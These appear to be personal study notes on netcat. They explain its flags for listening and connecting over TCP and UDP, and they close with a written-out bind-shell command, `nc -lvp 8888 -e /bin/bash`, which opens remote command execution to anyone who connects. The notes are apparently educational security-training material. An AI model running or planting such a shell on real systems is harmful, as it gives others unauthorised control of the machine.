
### General Notes

> `nc` for short.
> Allows various operations on TCP/UDP [[Transport Layer]] connections.
> Used in [[Web Application Fingerprinting]].

> Both a network client and a network server.

---

### netcat as a server: Listener

>Netcat to act as a server to listen on a specific port.
>`-l` flag to listen.
>`-v` flag for verbosity.
>`-p` flag to choose port `8888`.
>`-u` flag for udp.
```
nc -lvp 8888

nc -lvup 9999
```

---

### netcat as a client: Connector

> Netcat to act as a client to a specific target address and port.
```
nc -v <ip-address> <port>

nc -vu <ip-address> <port>
```

---

### netcat to spawn bind shell

> On the server side, add the flag `-e` with the argument `/bin/bash`.
> This executes the given program upon connection by a client.

* Server side: `nc -lvp 8888 -e /bin/bash`
* Client side: `nc -v <server-ip> 8888

> Now, the client can execute binary commands, and a bind shell is spawned.

---
